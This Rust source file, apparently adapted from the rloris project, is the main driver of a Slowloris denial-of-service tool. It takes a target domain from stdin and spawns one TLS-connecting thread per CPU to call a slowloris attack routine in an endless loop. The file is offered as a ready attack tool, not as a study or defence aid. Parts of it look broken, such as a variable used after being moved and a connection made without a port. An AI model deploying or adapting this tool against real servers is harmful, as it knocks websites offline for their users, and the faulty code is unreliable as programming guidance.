// https://github.com/NoraCodes/rloris

extern crate docopt;
extern crate rustc_serialize;
#[macro_use]
extern crate log;
extern crate env_logger;
extern crate num_cpus;
extern crate rustls;
extern crate webpki;
extern crate webpki_roots;

use docopt::Docopt;
use std::io::{stdin, BufRead, Error};
use std::net::TcpStream;
use std::sync::Arc;
use std::thread;

mod slowloris_attack;
use slowloris_attack::slowloris_attack;

// fix -> RustcDecodable
// #[derive(Debug)]
// struct Args {
//     arg_target: String,
//     flag_port: Option<usize>,
//     flag_timeout: u32,
//     flag_cycles: u32,
//     flag_ssl: bool,
//     flag_nofinalize: bool,
//     flag_domain: Option<String>,
//     flag_repeat: bool,
//     flag_threads: Option<usize>,
//     cmd_get: bool,
//     cmd_post: bool,
// }

#[derive(Clone)]
struct Target{
    target_domain: String,
    port: Option<i32>
}

impl Target {
    fn new(target_domain: String, port: Option<i32>) -> Self{
        Self { target_domain,  port }
    }
    fn get_designator(self) -> String{
        self.target_domain
    }
}

fn main() {
    self::show_logo();

    // 1 -> get
    // 2 -> post
    // set -> domain.com
    // protocol

    let (attack_option, domain)= self::input_domain_with_menu();

    // The default port is 80, but for SSL it's 443.
    let default_port = Option::from(443_i32); // or 80
    let finalize = true;
    let cycles = 0_u32;
    let timeout = 15_u32;
    let repeat = true;
    let threads = num_cpus::get();
    let ssl = true; //default ssl true
    let cmd_get= if attack_option == "1".to_string(){
        true
    }else {false};
    let cmd_post=if attack_option == "2".to_string(){
        true
    }else {false};

    let mut target = Target::new(domain, default_port);
    let domain_optional = Option::from(domain);

    // Set up rustls process global
    let mut ssl_config = rustls::ClientConfig::new();
    ssl_config
        .root_store
        .add_server_trust_anchors(&webpki_roots::TLS_SERVER_ROOTS);
    let ssl_config = Arc::new(ssl_config); // multiple threads

    loop {
        println!(
            "Beginning SlowLoris against target {} with {} threads.",
            target.get_designator(),
            threads
        );
        let mut handles = Vec::with_capacity(threads);
        
        for threadn in 0..threads {
            let target = target.clone();
            let ssl_config = ssl_config.clone();
            handles.push(
                thread::spawn(move || {
                    // Attempt to connect to the target.
                    let mut tcp_stream = TcpStream::connect(target.get_designator())
                        .unwrap_or_else(|e| {error!("[CONTROL:{}] !!! Couldn't connect. {}", threadn, e); panic!()});
                    info!("[CONTROL:{}] Succesfully connected to {}.", threadn, target.get_designator());
                    // If needed, connect SSL to the target.
                    if ssl {
                        // Attempt to connect SSL
                        let tgt_domain = webpki::DNSNameRef::try_from_ascii_str(&target.get_designator())
                            .unwrap_or_else(|e| {
                                error!("[CONTROL:{}] !!! Couldn't get DNS reference for domain. {}\nDid you provide a domain name, not an IP?", threadn, e);
                                panic!();
                            });
                        let mut ssl_stream = rustls::ClientSession::new(&ssl_config, tgt_domain);
                        info!("[CONTROL:{}] Successfully connected with TLS.", threadn);
                        if cmd_get {
                            slowloris_attack(&mut ssl_stream, timeout, cycles, finalize, false, threadn);
                        } else if cmd_post {
                            slowloris_attack(&mut ssl_stream, timeout, cycles, finalize, true, threadn);
                        }

                    // can't reach in default option(SSL always true)
                    } else {
                        if cmd_get {
                            slowloris_attack(&mut tcp_stream, timeout, cycles, finalize, false, threadn);
                        } else if cmd_post {
                            slowloris_attack(&mut tcp_stream, timeout, cycles, finalize, true, threadn);
                        }
                    }
                })
            );
        }

        if threads > 1 {
            for handle in handles {
                match handle.join() {
                    Ok(_) => print!("."),
                    Err(_) => print!("x"),
                };
                println!();
            }
        } else {
            // In this case there is only one thread. Pop it, join it, and suppress errors.
            panic!("It's can not work in this go");
        }
        if !repeat {
            break;
        }
    }
}

pub fn show_logo(){
    println!("--------------------------------------------------------------");
    println!("d888888b  .d8b.  d888888b .d8888. db    db db    db  .d8b.");
    println!("`~~88~~' d8' `8b `~~88~~' 88'  YP 88    88 `8b  d8' d8' `8b ");  
    println!("   88    88ooo88    88    `8bo.   88    88  `8bd8'  88ooo88 ");
    println!("   88    88~~~88    88      `Y8b. 88    88    88    88~~~88 ");
    println!("   88    88   88    88    db   8D 88b  d88    88    88   88 ");
    println!("   YP    YP   YP    YP    `8888Y' ~Y8888P'    YP    YP   YP ");
    println!("--------------------------------------------------------------");
}

fn input_domain_with_menu() -> (String, String){
    let std= stdin();
    let mut buff= stdin().lock().lines();
    let string_input= buff.next().unwrap().unwrap();
    let input_v: Vec<String>= string_input.split_whitespace()
        .map(|f| f.trim().to_string())
        .collect();

    let (attack_option, domain)= (input_v[0].clone(), input_v[1].clone()); 
    
    (attack_option, domain)
}